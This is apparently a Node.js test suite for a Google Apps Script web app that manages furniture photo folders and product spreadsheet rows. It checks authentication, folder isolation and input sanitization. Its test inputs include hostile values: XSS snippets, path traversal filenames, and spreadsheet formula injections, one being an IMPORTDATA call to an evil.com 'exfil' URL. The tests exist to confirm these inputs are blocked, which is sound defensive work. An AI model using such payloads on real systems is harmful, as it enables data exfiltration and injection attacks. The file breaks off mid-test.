import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { createMockGasEnvironment } from './gas_mock_env.mjs';

const REPO_ROOT = path.resolve(import.meta.dirname, '..');
const PROJECT_B_GS = path.join(REPO_ROOT, 'AppsScript_Prompts_Odoo.gs');

const IDS = {
  PROMPTS_SHEET: '1ZCLZppO5AH06Wp2gVuxMoaeX3oJwVHgTjRZ7hlqb6eg',
  SUBIR_PROPT: '1Xc-gaDUJHNSd_XSTob3b39CNYoC9UreX',
  BUZON_ODOO: '1rwRk-bZtb8m4Hso9pCJE1A0_QiS-rqUQ',
  FOTOS_ODOO: '1lfq8VBF1q-Kg9m6_qd2GU5zxwEywYw_B',
  ODOO_MUEBLES: '10UIhDWLKL0ySmzdcMemA5K5831YozuBa',
  ODOO_ACCESORIOS: '1z-Ne0hBzXIi1dTfJOxtz1kUUPYQQNpTR',
  ODOO_TELAS: '12gsKZVs6rFonOO8CIxokuE73bxhq8tS9',
  ODOO_OTROS: '13inkyy1ZfGn7yD0ceSr6RSMquaA3OBO1',
  TELAS: '1JKJPXcnPFPeoUOo_mBIUyl_KXM0Fn3Ul',
  MADERAS: '1Jq2u1A6-xKi1YigUYSIzLauUww_RJ5Lx',
  // Forbidden Project A resources
  SUBIR_PREN: '11_rR-qhgM02Sfx9zw7uHU5AwXvTpKD4p',
  CATEGORIAS_ROOT: '1KZh-AzOejRbz9TdHYF52yaiuejPtT-sN',
  FOTOS_SALAS: '1xo2z2bIE_HCscBiqFI8Ew-KhQacBElsb',
  FOTOS_NUEVAS_CARGADO: '1rPFbjvovC5fSDPHS29yYpbLwM90c-5L9',
  SHEET_CONTROL: '1xewqWPOlR5LMEFQXq1KsqvObg9PPlTkRGqfZ_4Iiv-8'
};

const TEST_PROMPTS_PIN = '9988';
const OWNER_AUTH = { ownerEmail: 'kevin.reyna@grupoanipa.com', pin: TEST_PROMPTS_PIN };
const SAMPLE_JPEG_DATA_URL = 'data:image/jpeg;base64,' + Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0xff, 0xd9]).toString('base64');

function postAction(env, payload) {
  const out = env.context.doPost({
    postData: { contents: JSON.stringify(payload) }
  });
  return JSON.parse(out.getContent());
}

function getAction(env, params = {}) {
  const out = env.context.doGet({ parameter: params });
  return JSON.parse(out.getContent());
}

function makeDatosGeneralRow(overrides = {}) {
  const row = new Array(52).fill('');
  for (const [colIdxStr, val] of Object.entries(overrides)) {
    row[Number(colIdxStr) - 1] = val;
  }
  return row;
}

function makeFotosNormRow(overrides = {}) {
  const row = new Array(16).fill('');
  for (const [colIdxStr, val] of Object.entries(overrides)) {
    row[Number(colIdxStr) - 1] = val;
  }
  return row;
}

function setupProjectBEnv({ buzonTrashed = true, promptsPin = TEST_PROMPTS_PIN, activeUserEmail = '' } = {}) {
  const scriptProperties = {};
  if (promptsPin) scriptProperties.PROMPTS_PIN = promptsPin;

  const env = createMockGasEnvironment({
    activeSpreadsheetId: IDS.PROMPTS_SHEET,
    activeUserEmail,
    scriptProperties
  });

  // Project B folders (SUBIDA DE FOTOS defaults to trashed, matching live Drive!)
  env.makeFolder(IDS.SUBIR_PROPT, 'SUBIR PROPT');
  env.makeFolder(IDS.BUZON_ODOO, 'SUBIDA DE FOTOS', { trashed: buzonTrashed });
  env.makeFolder(IDS.FOTOS_ODOO, 'fotos odoo');
  env.makeFolder(IDS.ODOO_MUEBLES, 'FOTOS MUEBLES', { parentId: IDS.FOTOS_ODOO });
  env.makeFolder(IDS.ODOO_ACCESORIOS, 'FOTOS ACCESORIOS Y ESPEJOS', { parentId: IDS.FOTOS_ODOO });
  env.makeFolder(IDS.ODOO_TELAS, 'FOTOS TELAS', { parentId: IDS.FOTOS_ODOO });
  env.makeFolder(IDS.ODOO_OTROS, 'OTROS', { parentId: IDS.FOTOS_ODOO });
  env.makeFolder(IDS.TELAS, 'TELAS', { parentId: IDS.ODOO_TELAS });
  env.makeFolder(IDS.MADERAS, 'MADERAS', { parentId: IDS.ODOO_TELAS });

  // Project A folders (MUST NEVER be touched by Project B)
  env.makeFolder(IDS.SUBIR_PREN, 'SUBIR PREN');
  env.makeFolder(IDS.CATEGORIAS_ROOT, 'CATEGORIAS MUEBLES Y ACCESORIOS');
  env.makeFolder(IDS.FOTOS_SALAS, 'FOTOS SALAS', { parentId: IDS.CATEGORIAS_ROOT });
  env.makeFolder(IDS.FOTOS_NUEVAS_CARGADO, 'FOTOS NUEVAS CARGADO');

  // Duplicate filenames in SUBIR PROPT (exact live Drive edge case!)
  env.makeFile('dup_id_small', 'MESA DE CENTRO NIDO DE TEKA CARDEADO CLARO 1220 X 61 X 30 CM.jpg', {
    parentId: IDS.SUBIR_PROPT,
    bytes: Buffer.alloc(390)
  });
  env.makeFile('dup_id_large', 'MESA DE CENTRO NIDO DE TEKA CARDEADO CLARO 1220 X 61 X 30 CM.jpg', {
    parentId: IDS.SUBIR_PROPT,
    bytes: Buffer.alloc(1493)
  });
  env.makeFile('propt_camastro', 'CAMASTRO LUSTRO DE MADERA.jpg', { parentId: IDS.SUBIR_PROPT });

  // Read-only swatch files
  env.makeFile('tela_001', 'ATLAS SAND.jpg', { parentId: IDS.TELAS });
  env.makeFile('madera_001', 'TEKA CARDEADO CLARO.jpg', { parentId: IDS.MADERAS });

  // Project A files that MUST be untouchable
  env.makeFile('proj_a_pren_file', 'GLOSS SANDS.jpg', { parentId: IDS.SUBIR_PREN });
  env.makeFile('proj_a_cat_file', 'SALA MILAN.jpg', { parentId: IDS.FOTOS_SALAS });

  // Base de Datos Generales with locked Row-3 formulas on DATOS GENERAL & FOTOS NORMALIZADAS
  const dgRow3Formulas = makeDatosGeneralRow({
    2: '=ARRAYFORMULA(XLOOKUP(...NOMBRE_VIEJO...))',
    15: '=ARRAYFORMULA(PROVEDOR_FORMULA)',
    17: '=ARRAYFORMULA(RAMA_FORMULA)',
    18: '=ARRAYFORMULA(PRECIO_FORMULA)',
    28: '=MAP($AC$3:$AC,LAMBDA(u,IMAGE(u)))',
    31: '=MAP($AF$3:$AF,LAMBDA(u,IMAGE(u)))',
    34: '=MAP($AI$3:$AI,LAMBDA(u,IMAGE(u)))',
    37: '=MAP($AL$3:$AL,LAMBDA(u,IMAGE(u)))',
    40: '=ARRAYFORMULA(CUBICAJE_CON_EMPAQUE)',
    45: '=ARRAYFORMULA(NOMBRE_COMPLETO)'
  });

  const dgRow4 = makeDatosGeneralRow({
    1: 'HAK1PLUMNASS8',
    2: 'SILLON LUMINA VIEJO',
    3: '85',
    4: '80',
    5: '78',
    6: 'n/A',
    7: '44',
    16: 'SILLONES',
    24: 'LUMINA',
    25: 'SILLON INDIVIDUAL',
    26: 'SILLON INDIVIDUAL LUMINA TEKA',
    27: 'LUMINA_MUEBLE.jpg',
    30: 'SAILCLOTH_SAND.jpg',
    33: 'TEKA_MATTE.jpg',
    36: 'SWATCH_LUMINA.jpg'
  });

  const dgRow5 = makeDatosGeneralRow({
    1: 'MESA-NIDO-01',
    3: '',
    4: '',
    5: '45',
    6: '90',
    16: 'MESAS DE CENTRO',
    25: 'MESA DE CENTRO',
    26: 'MESA NIDO REDONDA TEKA'
  });

  const fnRow3Formulas = makeFotosNormRow({
    3: '=MAP($D$3:$D,LAMBDA(u,IF(u="","",IMAGE(u))))',
    7: '=MAP($H$3:$H,LAMBDA(u,IF(u="","",IMAGE(u))))',
    11: '=MAP($L$3:$L,LAMBDA(u,IF(u="","",IMAGE(u))))',
    15: '=MAP($P$3:$P,LAMBDA(u,IF(u="","",IMAGE(u))))'
  });

  const fnRow4Existing = makeFotosNormRow({
    2: 'EXISTENTE_MUEBLE.jpg',
    4: 'https://drive.google.com/file/d/existing1/view?usp=sharing'
  });

  env.makeSpreadsheet(IDS.PROMPTS_SHEET, 'Base de Datos Generales', {
    'DATOS GENERAL': [
      ['SIN EMPAQUE'],
      ['SKU', 'NOMBRE VIEJO', 'FRENTE', 'FONDO', 'ALTO', 'DIAMETRO', 'PISO-ASIENTO'],
      dgRow3Formulas,
      dgRow4,
      dgRow5
    ],
    'FOTOS NORMALIZADAS': [
      ['MUEBLE'],
      ['', 'NOMBRE', 'FOTO', 'LINK'],
      fnRow3Formulas,
      fnRow4Existing
    ]
  });

  env.makeSpreadsheet(IDS.SHEET_CONTROL, 'Control de Productos', { '1': [['SKU']] });
  env.loadScript(PROJECT_B_GS);
  return env;
}

test('Project B: prompts_health (GET & POST) reports folder counts, pinConfigured, CacheService hit, and avoids per-file getParents RPCs on bulk catalog folders', () => {
  const env = setupProjectBEnv({ buzonTrashed: true, promptsPin: TEST_PROMPTS_PIN });
  env.resetFileGetParentsCalls();

  const getRes = getAction(env, { action: 'prompts_health' });
  assert.equal(getRes.ok, true);
  assert.equal(getRes.project, 'prompts_odoo');
  assert.equal(getRes.sheetId, IDS.PROMPTS_SHEET);
  assert.equal(getRes.pinConfigured, true);
  assert.ok(!JSON.stringify(getRes).includes(TEST_PROMPTS_PIN), 'prompts_health must NEVER leak PIN value');
  assert.equal(getRes.bulkCacheHit, false);
  assert.equal(getRes.folders.subirPropt.ok, true);
  assert.equal(getRes.folders.subirPropt.count, 3);
  assert.equal(getRes.folders.buzonOdoo.trashed, true);
  assert.equal(getRes.folders.buzonOdoo.ok, false);
  assert.equal(getRes.folders.telas.count, 1);
  assert.equal(getRes.folders.maderas.count, 1);
  assert.ok(getRes.warnings.some((w) => /SUBIDA DE FOTOS|Papelera|trashed/i.test(w)));
  assert.ok(getRes.isolation.forbiddenProjectAIdsCount >= 14);

  // Item 7: TELAS and MADERAS normal files must have ZERO getParents() RPCs!
  assert.equal(env.filesById.get('tela_001')._state.getParentsCalls, 0);
  assert.equal(env.filesById.get('madera_001')._state.getParentsCalls, 0);

  // Second call uses CacheService 120s cache
  const postRes = postAction(env, { action: 'prompts_health' });
  assert.equal(postRes.ok, true);
  assert.equal(postRes.bulkCacheHit, true);
  assert.equal(postRes.folders.buzonOdoo.trashed, true);

  // fullScan: true bypasses cache
  const fullRes = postAction(env, { action: 'prompts_health', fullScan: true });
  assert.equal(fullRes.ok, true);
  assert.equal(fullRes.bulkCacheHit, false);
});

test('Project B (Item 5): doGet restricts strictly to health/ping and external calls FAIL CLOSED when PROMPTS_PIN is unset', () => {
  const envNoPin = setupProjectBEnv({ promptsPin: '', activeUserEmail: '' });

  // prompts_health reports pinConfigured: false
  const health = getAction(envNoPin, { action: 'prompts_health' });
  assert.equal(health.ok, true);
  assert.equal(health.pinConfigured, false);

  // External POST when PROMPTS_PIN is NOT configured fails closed with pinSetupRequired: true
  const noPinList = postAction(envNoPin, {
    action: 'prompts_propt_list',
    ownerEmail: 'kevin.reyna@grupoanipa.com'
  });
  assert.equal(noPinList.ok, false);
  assert.equal(noPinList.authRequired, true);
  assert.equal(noPinList.pinSetupRequired, true);
  assert.match(noPinList.error, /PROMPTS_PIN|Configurar PIN/i);

  // Same-owner Sheets execution (activeUserEmail === owner) IS allowed even without PIN
  envNoPin.setActiveUserEmail('kevin.reyna@grupoanipa.com');
  const ownerSessList = postAction(envNoPin, { action: 'prompts_propt_list' });
  assert.equal(ownerSessList.ok, true);
  // But explicit wrong ownerEmail still rejected even over active owner session
  const wrongEmailOverSess = postAction(envNoPin, { action: 'prompts_propt_list', ownerEmail: 'intruder@evil.com' });
  assert.equal(wrongEmailOverSess.ok, false);

  // doGet MUST REJECT all mutating & operational actions (POST-only!)
  const envWithPin = setupProjectBEnv({ promptsPin: TEST_PROMPTS_PIN });
  for (const badGetAction of [
    'prompts_propt_delete',
    'prompts_propt_upload',
    'prompts_propt_list',
    'odoo_register_foto',
    'odoo_move_to_final',
    'prompts_repair_permissions'
  ]) {
    const res = getAction(envWithPin, {
      action: badGetAction,
      ...OWNER_AUTH,
      fileId: 'propt_camastro'
    });
    assert.equal(res.ok, false, `doGet must reject ${badGetAction}`);
    assert.match(res.error, /HTTP POST/i);
  }
  assert.equal(envWithPin.filesById.get('propt_camastro').isTrashed(), false);
});

test('Project B: prompts_propt_list, upload, and delete operate ONLY on SUBIR PROPT, preserve duplicate filenames by ID, and reject invalid MIME or unauthorized callers', () => {
  const env = setupProjectBEnv({ promptsPin: TEST_PROMPTS_PIN });

  // Unauthorized caller (missing/wrong email or missing/wrong PIN) is rejected
  const unauth1 = postAction(env, { action: 'prompts_propt_list', ownerEmail: 'intruder@example.com', pin: TEST_PROMPTS_PIN });
  assert.equal(unauth1.ok, false);
  assert.equal(unauth1.forbidden, true);

  const unauth2 = postAction(env, { action: 'prompts_propt_list', ownerEmail: 'kevin.reyna@grupoanipa.com', pin: '0000' });
  assert.equal(unauth2.ok, false);
  assert.equal(unauth2.forbidden, true);

  // List preserves BOTH duplicate filenames distinctly by file ID
  const listRes = postAction(env, { action: 'prompts_propt_list', ...OWNER_AUTH });
  assert.equal(listRes.ok, true);
  assert.equal(listRes.folderId, IDS.SUBIR_PROPT);
  assert.equal(listRes.files.length, 3);
  const dupIds = listRes.files
    .filter((f) => f.name.includes('MESA DE CENTRO NIDO'))
    .map((f) => f.id)
    .sort();
  assert.deepEqual(dupIds, ['dup_id_large', 'dup_id_small']);

  // Upload invalid MIME type rejected
  const badMime = postAction(env, {
    action: 'prompts_propt_upload',
    ...OWNER_AUTH,
    fileName: 'script.html',
    dataUrl: 'data:text/html;base64,' + Buffer.from('<script>alert(1)</script>').toString('base64')
  });
  assert.equal(badMime.ok, false);
  assert.match(badMime.error, /MIME|no permitido/i);

  // Upload valid JPEG succeeds ONLY in SUBIR PROPT with ANYONE_WITH_LINK VIEW
  const upRes = postAction(env, {
    action: 'prompts_propt_upload',
    ...OWNER_AUTH,
    fileName: 'NUEVA FOTO RENDER.jpg',
    dataUrl: SAMPLE_JPEG_DATA_URL
  });
  assert.equal(upRes.ok, true);
  assert.equal(upRes.folderId, IDS.SUBIR_PROPT);
  assert.ok(env.foldersById.get(IDS.SUBIR_PROPT)._state.fileIds.has(upRes.file.id));
  assert.deepEqual(env.filesById.get(upRes.file.id)._state.sharing, {
    access: 'ANYONE_WITH_LINK',
    perm: 'VIEW'
  });

  // Delete ONE of the duplicate filenames by file ID leaves the sibling duplicate untouched!
  const delOne = postAction(env, {
    action: 'prompts_propt_delete',
    ...OWNER_AUTH,
    fileId: 'dup_id_small'
  });
  assert.equal(delOne.ok, true);
  assert.equal(env.filesById.get('dup_id_small').isTrashed(), true);
  assert.equal(env.filesById.get('dup_id_large').isTrashed(), false);
});

test('Project B (Items 9 & 11): pre-dispatch Project A ID guard, depth-2 ancestor walk, fail-closed getParents, and filename/URL sanitization', () => {
  const env = setupProjectBEnv();

  // Direct attempt to delete file in SUBIR PREN & FOTOS SALAS
  const delPren = postAction(env, { action: 'prompts_propt_delete', ...OWNER_AUTH, fileId: 'proj_a_pren_file' });
  assert.equal(delPren.ok, false);
  assert.match(delPren.error, /Aislamiento Proyecto A\/B/i);
  assert.equal(env.filesById.get('proj_a_pren_file').isTrashed(), false);

  const delCat = postAction(env, { action: 'prompts_propt_delete', ...OWNER_AUTH, fileId: 'proj_a_cat_file' });
  assert.equal(delCat.ok, false);
  assert.match(delCat.error, /Aislamiento Proyecto A\/B/i);
  assert.equal(env.filesById.get('proj_a_cat_file').isTrashed(), false);

  // Pre-dispatch guard rejects Project A IDs in ALL payload ID fields!
  for (const field of ['folderId', 'destFolderId', 'targetFolderId', 'targetSubfolder', 'subfolderKey', 'sheetId', 'spreadsheetId']) {
    const res = postAction(env, {
      action: 'prompts_propt_list',
      ...OWNER_AUTH,
      [field]: field.includes('sheet') ? IDS.SHEET_CONTROL : IDS.SUBIR_PREN
    });
    assert.equal(res.ok, false, `Pre-dispatch must reject Project A ID in ${field}`);
    assert.equal(res.forbiddenFolder, true);
  }

  // Depth-2 ancestor check: multi-parent file in SUBIR PROPT + child subfolder of SUBIR PREN must be rejected!
  env.makeFolder('sub_pren_child_01', 'Lote PREN', { parentId: IDS.SUBIR_PREN });
  env.makeFile('multi_propt_pren_child', 'SHARED.jpg', {
    parentIds: [IDS.SUBIR_PROPT, 'sub_pren_child_01']
  });
  const delDepth2 = postAction(env, {
    action: 'prompts_propt_delete',
    ...OWNER_AUTH,
    fileId: 'multi_propt_pren_child'
  });
  assert.equal(delDepth2.ok, false);
  assert.equal(env.filesById.get('multi_propt_pren_child').isTrashed(), false);

  // Fail closed when getParents() throws
  env.makeFile('propt_throw_parents', 'THROW.jpg', { parentId: IDS.SUBIR_PROPT, throwOnGetParents: true });
  assert.equal(env.context.isFileInForbiddenProjectAFolder_(env.filesById.get('propt_throw_parents')), true);

  // Item 11: Filename sanitization (path traversal & empty-after-sanitization)
  const upTrav = postAction(env, {
    action: 'prompts_propt_upload',
    ...OWNER_AUTH,
    fileName: '../../evil.png',
    dataUrl: 'data:image/png;base64,' + Buffer.from([0x89, 0x50, 0x4e, 0x47]).toString('base64')
  });
  assert.equal(upTrav.ok, true);
  assert.equal(upTrav.file.name, 'evil.png');

  const upSlashes = postAction(env, {
    action: 'prompts_propt_upload',
    ...OWNER_AUTH,
    fileName: '///',
    dataUrl: 'data:image/png;base64,' + Buffer.from([0x89, 0x50, 0x4e, 0x47]).toString('base64')
  });
  assert.equal(upSlashes.ok, true);
  assert.match(upSlashes.file.name, /^subir_propt_\d+\.png$/);

  const upSpaces = postAction(env, {
    action: 'prompts_propt_upload',
    ...OWNER_AUTH,
    fileName: '   ',
    dataUrl: 'data:image/png;base64,' + Buffer.from([0x89, 0x50, 0x4e, 0x47]).toString('base64')
  });
  assert.equal(upSpaces.ok, true);
  assert.match(upSpaces.file.name, /^subir_propt_\d+\.png$/);

  // Item 11: savePromptsWebAppUrlToConfig_ rejects crafted suffix /exec@evil.com
  const badConfigUrl = env.context.savePromptsWebAppUrlToConfig_('https://script.google.com/macros/s/abc123/exec@evil.com');
  assert.equal(badConfigUrl.ok, false);
});

test('Project B (Item 7): prompts_materials_list reads TELAS & MADERAS without per-file getParents RPCs and blocks shortcuts to Project A', () => {
  const env = setupProjectBEnv();
  // Add a broken shortcut and a shortcut pointing to SUBIR PREN inside TELAS
  env.makeFile('tela_sc_pren', 'fake_tela.jpg', {
    mimeType: 'application/vnd.google-apps.shortcut',
    parentId: IDS.TELAS,
    targetId: 'proj_a_pren_file'
  });
  env.makeFile('tela_sc_broken', 'broken_tela.jpg', {
    mimeType: 'application/vnd.google-apps.shortcut',
    parentId: IDS.TELAS,
    targetId: 'missing_target_id'
  });

  env.resetFileGetParentsCalls();
  const res = postAction(env, { action: 'prompts_materials_list', ...OWNER_AUTH });
  assert.equal(res.ok, true);
  assert.equal(res.readOnly, true);
  assert.equal(res.counts.telas, 1);
  assert.equal(res.counts.maderas, 1);
  assert.equal(res.telas[0].id, 'tela_001');
  assert.equal(res.maderas[0].id, 'madera_001');
  assert.equal(env.filesById.get('tela_001')._state.getParentsCalls, 0);
  assert.equal(env.filesById.get('madera_001')._state.getParentsCalls, 0);
});

test('Project B: prompts_sku_lookup finds exact, normalized, and >=4-char prefix SKUs in DATOS GENERAL!A4:AJ and formats medidas', () => {
  const env = setupProjectBEnv();

  const exact = postAction(env, { action: 'prompts_sku_lookup', ...OWNER_AUTH, sku: 'HAK1PLUMNASS8' });
  assert.equal(exact.ok, true);
  assert.equal(exact.found, true);
  assert.equal(exact.matchType, 'exact');
  assert.equal(exact.match.fila, 4);
  assert.equal(exact.match.tipo_mueble, 'SILLON INDIVIDUAL');
  assert.equal(exact.match.medidas, '85 x 80 x 78 x asiento 44 cm');
  assert.equal(exact.match.foto_mueble_nom, 'LUMINA_MUEBLE.jpg');

  const norm = postAction(env, { action: 'prompts_sku_lookup', ...OWNER_AUTH, sku: 'mesa nido 01' });
  assert.equal(norm.ok, true);
  assert.equal(norm.found, true);
  assert.equal(norm.matchType, 'normalized');
  assert.equal(norm.match.fila, 5);
  assert.equal(norm.match.medidas, 'D. 90 x Alto 45 cm');

  const pref = postAction(env, { action: 'prompts_sku_lookup', ...OWNER_AUTH, sku: 'HAK1P' });
  assert.equal(pref.ok, true);
  assert.equal(pref.found, true);
  assert.equal(pref.matchType, 'prefix');
  assert.equal(pref.match.sku, 'HAK1PLUMNASS8');
});

test('Project B (Items 9 & 10): odoo_buzon & odoo_move_to_final handle trashed SUBIDA DE FOTOS, allowFromPropt bypass, trashed source rejection, and strict subfolderKey', () => {
  // Part 1: Trashed SUBIDA DE FOTOS
  const envTrashed = setupProjectBEnv({ buzonTrashed: true });
  const listTrashed = postAction(envTrashed, { action: 'odoo_buzon_list', ...OWNER_AUTH });
  assert.equal(listTrashed.ok, false);
  assert.equal(listTrashed.folderTrashed, true);

  const upTrashed = postAction(envTrashed, {
    action: 'odoo_buzon_upload',
    ...OWNER_AUTH,
    fileName: 'buzon.jpg',
    dataUrl: SAMPLE_JPEG_DATA_URL
  });
  assert.equal(upTrashed.ok, false);
  assert.equal(upTrashed.folderTrashed, true);

  // Without allowFromPropt, moving fails with folderTrashed: true
  const moveTrashed = postAction(envTrashed, {
    action: 'odoo_move_to_final',
    ...OWNER_AUTH,
    fileId: 'propt_camastro',
    subfolderKey: 'MUEBLES'
  });
  assert.equal(moveTrashed.ok, false);
  assert.equal(moveTrashed.folderTrashed, true);

  // Item 9: Unknown subfolderKey must be explicitly rejected (NO fallback to ROOT!)
  const badSubfolder = postAction(envTrashed, {
    action: 'odoo_move_to_final',
    ...OWNER_AUTH,
    fileId: 'propt_camastro',
    allowFromPropt: true,
    subfolderKey: 'MUEBLE_TYPO'
  });
  assert.equal(badSubfolder.ok, false);
  assert.match(badSubfolder.error, /Subcarpeta destino inválida/i);

  // Item 10: With allowFromPropt: true, moving from SUBIR PROPT -> fotos odoo SUCCEEDS even while SUBIDA DE FOTOS is trashed!
  const moveFromProptOk = postAction(envTrashed, {
    action: 'odoo_move_to_final',
    ...OWNER_AUTH,
    fileId: 'propt_camastro',
    allowFromPropt: true,
    subfolderKey: 'MUEBLES'
  });
  assert.equal(moveFromProptOk.ok, true);
  assert.equal(moveFromProptOk.destFolderId, IDS.ODOO_MUEBLES);
  assert.ok(envTrashed.foldersById.get(IDS.ODOO_MUEBLES)._state.fileIds.has('propt_camastro'));

  // Item 10: Trashed source file must be rejected
  envTrashed.makeFile('trashed_propt_file', 'OLD.jpg', { parentId: IDS.SUBIR_PROPT, trashed: true });
  const moveTrashedSrc = postAction(envTrashed, {
    action: 'odoo_move_to_final',
    ...OWNER_AUTH,
    fileId: 'trashed_propt_file',
    allowFromPropt: true,
    subfolderKey: 'MUEBLES'
  });
  assert.equal(moveTrashedSrc.ok, false);
  assert.equal(moveTrashedSrc.fileTrashed, true);

  // Part 2: Restored/Active SUBIDA DE FOTOS
  const envActive = setupProjectBEnv({ buzonTrashed: false });
  const upOk = postAction(envActive, {
    action: 'odoo_buzon_upload',
    ...OWNER_AUTH,
    fileName: 'ODOO_SILLA.jpg',
    dataUrl: SAMPLE_JPEG_DATA_URL
  });
  assert.equal(upOk.ok, true);
  assert.equal(upOk.folderId, IDS.BUZON_ODOO);

  const listOk = postAction(envActive, { action: 'odoo_buzon_list', ...OWNER_AUTH });
  assert.equal(listOk.ok, true);
  assert.equal(listOk.count, 1);

  const moveOk = postAction(envActive, {
    action: 'odoo_move_to_final',
    ...OWNER_AUTH,
    fileId: upOk.file.id,
    subfolderKey: 'muebles',
    newName: 'ODOO_SILLA_FINAL.jpg'
  });
  assert.equal(moveOk.ok, true);
  assert.equal(moveOk.destFolderId, IDS.ODOO_MUEBLES);
  assert.ok(envActive.foldersById.get(IDS.ODOO_MUEBLES)._state.fileIds.has(upOk.file.id));
  assert.ok(!envActive.foldersById.get(IDS.BUZON_ODOO)._state.fileIds.has(upOk.file.id));
});

test('Project B (Item 6): odoo_register_foto is atomic, enforces strict row bounds, fila/datosGeneralUpdates, Row-3/formula-col locks, and blocks formula injection', () => {
  const env = setupProjectBEnv();
  const ss = env.spreadsheetsById.get(IDS.PROMPTS_SHEET);
  const shNorm = ss.getSheetByName('FOTOS NORMALIZADAS');
  const shDg = ss.getSheetByName('DATOS GENERAL');

  const normRow3Before = shNorm.getRange(3, 1, 1, 16).getValues()[0];
  const dgRow3Before = shDg.getRange(3, 1, 1, 52).getValues()[0];

  // 1) ATOMIC PRE-VALIDATION: valid tipo/nombre/link + invalid datosGeneralRow: 3 MUST leave ZERO writes in FOTOS NORMALIZADAS!
  const writeCountBefore = shNorm._writeLog.length;
  const atomicFail = postAction(env, {
    action: 'odoo_register_foto',
    ...OWNER_AUTH,
    tipo: 'MUEBLE',
    nombre: 'ORPHAN_TEST.jpg',
    link: 'https://drive.google.com/file/d/orphan1/view',
    datosGeneralRow: 3
  });
  assert.equal(atomicFail.ok, false);
  assert.equal(atomicFail.formulaProtected, true);
  assert.equal(shNorm._writeLog.length, writeCountBefore, 'FOTOS NORMALIZADAS must have ZERO writes on failed combined request');

  // 2) Strict row validation: NaN, abc, 0, -1, 3, 4.7, Infinity, 10000000, fila: 3 all rejected with 0 writes
  for (const badPayload of [
    { tipo: 'MUEBLE', nombre: 'A.jpg', link: 'https://drive.google.com/file/d/1/view', rowNumber: 3 },
    { tipo: 'MUEBLE', nombre: 'A.jpg', link: 'https://drive.google.com/file/d/1/view', rowNumber: 0 },
    { tipo: 'MUEBLE', nombre: 'A.jpg', link: 'https://drive.google.com/file/d/1/view', rowNumber: 'abc' },
    { tipo: 'MUEBLE', nombre: 'A.jpg', link: 'https://drive.google.com/file/d/1/view', rowNumber: 4.7 },
    { tipo: 'MUEBLE', nombre: 'A.jpg', link: 'https://drive.google.com/file/d/1/view', rowNumber: 10000000 },
    { datosGeneralRow: 3, datosGeneralFields: { frente: '100' } },
    { fila: 3, datosGeneralFields: { frente: '100' } },
    { datosGeneralRow: 4, fila: 5, datosGeneralFields: { frente: '100' } },
    { datosGeneralRow: 4, datosGeneralUpdates: { B: 'EVIL_FORMULA_COL' } }
  ]) {
    const res = postAction(env, { action: 'odoo_register_foto', ...OWNER_AUTH, ...badPayload });
    assert.equal(res.ok, false, `Must reject invalid row/update payload: ${JSON.stringify(badPayload)}`);
  }
  assert.equal(shNorm._writeLog.length, writeCountBefore);
  assert.equal(shDg._writeLog.length, 0);

  // 3) Formula injection protection on nombre, link, and DATOS GENERAL fields
  const injName = postAction(env, {
    action: 'odoo_register_foto',
    ...OWNER_AUTH,
    tipo: 'MUEBLE',
    nombre: '=HYPERLINK("https://evil.com","CLICK")',
    link: 'https://drive.google.com/file/d/1/view'
  });
  assert.equal(injName.ok, false);
  assert.equal(injName.formulaInjectionBlocked, true);

  const injLink = postAction(env, {
    action: 'odoo_register_foto',
    ...OWNER_AUTH,
    tipo: 'MUEBLE',
    nombre: 'OK.jpg',
    link: '=IMPORTDATA("https://evil.com/exfil")'
  });
  assert.equal(injLink.ok, false);
  assert.equal(injLink.invalidLink, true);
  assert.equal(injLink.formulaInjectionBlocked, true);

  const injJsLink = postAction(env, {
    action: 'odoo_register_foto',
    ...OWNER_AUTH,
    datosGeneralRow: 4,
    datosGeneralFields: { foto_mueble_link: 'javascript:alert(1)' }
  });
  assert.equal(injJsLink.ok, false);
  assert.equal(injJsLink.invalidLink, true);

  const injDgText = postAction(env, {
    action: 'odoo_register_foto',
    ...OWNER_AUTH,
    fila: 4,
    datosGeneralUpdates: { nombre_nuevo: '=IMPORTRANGE("evil","A1")' }
  });
  assert.equal(injDgText.ok, false);
  assert.equal(injDgText.formulaInjectionBlocked, true);
  assert.equal(shDg._writeLog.length, 0);

  // 4) Valid combined registration using fila/datosGeneralFields writes ONLY safe manual columns
  const regMueble = postAction(env, {
    action: 'odoo_register_foto',
    ...OWNER_AUTH,
    tipo: 'MUEBLE',
    nombre: 'SILLON_MUEBLE.jpg',
    link: 'https://drive.google.com/file/d/m1/view?usp=sharing',
    sku: 'HAK1PLUMNASS8',
    updateDatosGeneral: true,
    datosGeneralFields: {
      frente: '86',
      B: 'HACK_FORMULA_B',
      O: 'HACK_FORMULA_O',
      R: 'HACK_PRECIO',
      AB: 'HACK_IMAGE_AB',
      AN: 'HACK_CUBICAJE'
    }
  });
  assert.equal(regMueble.ok, true);
  assert.equal(regMueble.fotosNormalizadas.row, 5);
  assert.equal(regMueble.fotosNormalizadas.nameCol, 'B');
  assert.equal(regMueble.fotosNormalizadas.linkCol, 'D');
  assert.equal(shNorm.getRange(5, 2).getValue(), 'SILLON_MUEBLE.jpg');
  assert.equal(shNorm.getRange(5, 3).getValue(), '');
  assert.equal(shNorm.getRange(5, 4).getValue(), 'https://drive.google.com/file/d/m1/view?usp=sharing');

  assert.equal(regMueble.datosGeneral.row, 4);
  assert.deepEqual(regMueble.datosGeneral.blockedColumns.sort(), ['AB', 'AN', 'B', 'O', 'R']);
  assert.equal(shDg.getRange(4, 3).getValue(), '86');
  assert.equal(shDg.getRange(4, 27).getValue(), 'SILLON_MUEBLE.jpg');
  assert.equal(shDg.getRange(4, 29).getValue(), 'https://drive.google.com/file/d/m1/view?usp=sharing');
  assert.equal(shDg.getRange(4, 2).getValue(), 'SILLON LUMINA VIEJO');
  assert.equal(shDg.getRange(4, 28).getValue(), '');

  // Valid fila + datosGeneralUpdates alias works
  const regAlias = postAction(env, {
    action: 'odoo_register_foto',
    ...OWNER_AUTH,
    fila: 5,
    datosGeneralUpdates: { fondo: '90' }
  });
  assert.equal(regAlias.ok, true);
  assert.equal(shDg.getRange(5, 4).getValue(), '90');

  // Verify TELA -> F/H, MADERA -> J/L, SWATCH -> N/P
  const regTela = postAction(env, { action: 'odoo_register_foto', ...OWNER_AUTH, tipo: 'TELA', nombre: 'TELA1.jpg', link: 'https://drive.google.com/file/d/t1/view' });
